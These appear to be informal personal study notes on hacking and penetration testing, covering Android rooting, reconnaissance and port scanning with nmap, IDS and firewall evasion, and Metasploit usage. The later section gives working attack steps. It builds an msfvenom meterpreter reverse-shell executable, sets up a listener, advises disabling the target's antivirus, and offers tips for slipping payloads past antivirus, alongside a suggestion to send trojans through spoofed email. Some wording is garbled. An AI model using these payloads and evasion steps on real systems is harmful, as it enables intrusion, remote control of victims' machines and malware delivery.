Download Kingo  root for pc to root android device, you have to enable USB debugging mode going to setting to be developer tapping 7 times in build number. If you have job as hacker you need to root devices to find evidence of being hacked.
 Eases.com ,eases is best for recovering lost or deleted data. You need to recover data as evidence of leaking confidential data and later deleting or formatting device to remove evidence.

Use mobile anti spyware
Use bullguard application, it is antivirus which find your lostphone, wipe the confidential data if lost, lock the stolen phone

Hacking
 information gathering, scanning, gain access/ exploitation, maintain access(backdoor, root kit), covering tracks
Sudo su command so you don’t need to use sudo anymore ie no need to write root password
As ifconfig need root privilege to execute

Sudo touch file1
Sudo nano file1
Then file1 also need root privilege like ifconfig
Ping ICMP packets.  Get IP address
nslookup Facebook.com command gives IP address both v4 & v6
Whois Facebook.com command for more info.     Imp
whatweb —help. WhatWeb thapadipendra.com.np -v.     Imp. Stealthy scan by default
whatWeb 192.168.2.0-255 —aggression 3 -v —no-errors
To gather OSINT info eg email for certain company:  theHarvester -d Facebook.com -b all or use website hunter.io. theHarvester give different result if we check after certain hours.

Search information gathering tools GitHub for other tools
Clone from GitHub and use Sherlock


##Get IP address and name of system active in your LAN: sudo arp -a(not better option). OR   sudo netdiscover (much better option because arp look for arp table and sometime new device are not presented arp table of hacking device as it hasn’t accessed or ping new device or table info can be deleted)


To find IP address pf router:  netstat -nr

Scanning metasploit or other device using Nmap: 
Read manual using man Nmap or you can use nmap —help 
When doing UDP scan (-sU) it takes time so use up arrow in certain time wait to know percentage of scan completed. Don’t ignore this scan as people may ignore to close while developing website or running services.
In TCP using -sS you don’t perform all three way handshake as in -sT(will leave much more trace than -sS) so, it is fast(only perform first operation of 3 way handshake).       —scanFlags advance please read it.
Use nmap -O 192.168.1.105 to find operating system( can be use to know it is virtual machine or not too, so to detect honeypot before hacking). To know operating system need at least 1 open port and 1 closed port.

Version discover of software running in open ports:
Use sudo nmap -sV 192.168.1.105  OR sudo nmap -A 192.168.1.105(aggressive and advance so, use only after permission but best, powerful but easy detectable behind security measures like firewall) OR  nmap -sV  - -version-intensity 9 192.168.1.105 (here higher intensity(between 0-9) more accurate correct version number. Default intensity is 7 so 99% of time default is used.


Running nmap with script using -A and bypass IDS & IPS:  -p for some port -F for top 100 port check, oN for output in file
  -sn option in nmap does same as netdiscover  tool did which locate all the host that are up and running.

Nmap helps find what ports are open and what ports are closed, some of our target might host services on ports hiding behind the firewall, and if we scan it will tell those ports are filtered(ie firewall dropping nmap packets)

Bypassing firewall don’t work on regular machine as the drop all packets without rule, only applied rules can be applied like MAC address or port filtering, use 
-f or -mtu <value(8 multiple)>. Eg sudo nmap -f -f 192.168.2.12. adding -f = each fragment 8 byte, so -f -f=16 byte tiny fragmented ip packet. Split TCP header over several packets to make harder for packet filter or IDS to detect what you are doing. Don’t work for some network as some program can’t handle fragments or may disable to handle.

Another important option by hiding your IP address, then bypassing firewall security by creating decoys using -D. our IP address mixed with Decoys of IP address. IDS might report multiple IO address including yours but don’t find true one. Look on Wireshark(destination Wireshark) to find how it work on destination machine.  To destination flooded with random IP address use sudo -D -RND:5 192.168.2.67 -sS. Here D=decoy, RND=random, 5=five random IP address. If we do local scan using random IP address, destination will recognize as being same subnet mask but works with destination in different subnet. So in same subnet system scan instead use following : sudo nmap -D 192.168.2.3, 192.168.2.67, 192.168.2.88, ME  192.168.2.1<destination IP>  -sS.Target inside same network use 2nd option and target outside your network use anyone.

sudo nmap -S 8.8.8.8 -Pn -e eth0 -g 7777   s= spoof your IP address.problem is that you will not get the result of scan back as they will be send to IP address they try to impersonate(8.8.8.8). -Pn is used to assume that all target host are online and it should be included in this scan because we don’t do ping here as result go do impersonated IP. e= network interface. -g=specify source port where firewall may filter all port and only give permission to access certain port it is handy eg 7777. -sF vs -sS. Syndicate scan vs fin scan. Fin scan sending fin packet without other flags. Timing templet -T1 for IDS evasion but take lot of time.   

Nmap alternative zenmap(graphical)

Nmap scripts=google and find generic script name like auth
Eg sudo nmap —script auth 192.168.1.95 -sS -F.   f= make fast by top ports scan. Replace auth with other higher general script with many specific or use specific script at cd usr/share/nmap/scripts.  

Find version using -sV and find exploit code for goggling that exploit for that version or use command searchsploit <name or (name and version)>.   exploit To find name and version use -sV. Use locate command copying path file.   Eg locate exploit.py.

Best tool for vulnerability analysis: Nessus:: free version only allow us to scan internal IP address. Pay for more.  

You can install it in Nessus

Open port software may have bug which can be exploitable to make software to work not intended to call exploitable vulnerability. And can even drop payload or a shell for control and access.
People are weakest spots so, spoof email as their friend send payload as trozen horse.
Reverse shells(target machine trying connect back our kali linux, so we listen on certain port for incoming connection before exploit, can bypass firewall so, it is best) vs bind shells

Find metasploit folder using locate command and go through each. Msfconsole
Show payload, show exploits, etc.  use exploit/windows/ftp/exploit.rb,   show info, show options, set LHOST 192.25.2.2, set payload <payload name>, 

Command shells(commonly used terminal) vs meterpreter shells(terminal for more things like hack microphone, cam, screenshot, upload download file). 

Encoder and evasion module to bypass antivirus and windows defender respectively.
Nops(no operation, if you have programmed in assembly code you will familiar with this) is instruction for processor to do nothing, used in buffer overflow.

To find if there is exploit for certain software having version founded bs -sV. Use searchsploit <software+-version name>


Use netcat(nc) command to listen to certain port.  + to make connection to listening target port. Nc —help
Sudo su to become root
Whoami to know you are root
Use auxiliary modules if -sV don’t give exact version.

Eternal blue SMB 445 attack, use auxiliary module to see if it is vulnerable,   search eternal blue, 
Variant of eternal blue exploit called double pulser

SMBghost window 10.19.03/10.19.09 vulnerability. 

Rufus.ie create bootable usb drive
9. SMBGhost CVE 2020-0796 - Windows 10 Manual Exploitation


*****For hacking non vulnerable system
Step 1>-turnoff windows defender or antivirus of target as we are going to create payload using msfvenum tool from metas-loot framework which is detectable.

Step 2>-execute command msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.242 LPORT=5555 -f exe -o reverse_shell.exe

Step 3>-before executing shell.exe in windows computer ,we need to listen to port 5555 of kali linux, this is done by metasploit framework in background when we execute executable but In this case we need to listen.

Step 4>- commands. Msfconsole, use exploit/multi/handler, show options, set payload windows/x64/meterpreter/reverse_tcp, show options, set LHOST 192.168.2.242, set LPORT 5555, run.      After that execute shell.exe in windows.

Some ideas to reduce file size or make payload file undetectable to antivirus or defender
1> virustotal.com is the website to check if file is detectable, but they will send your file to antivirus vendors, after few days you cannot use that payload anymore.
2>msfvenom —help, msfvenom —list formats(for file type eg py, exe), -a, -e, -i, -n , —platform windows, -f, -o, -x putty.exe, reduces antivirus.
3>create payload of program rather executable to completely reduce number of antivirus that can detect
4>to get other payload, msfvenom —list payloads
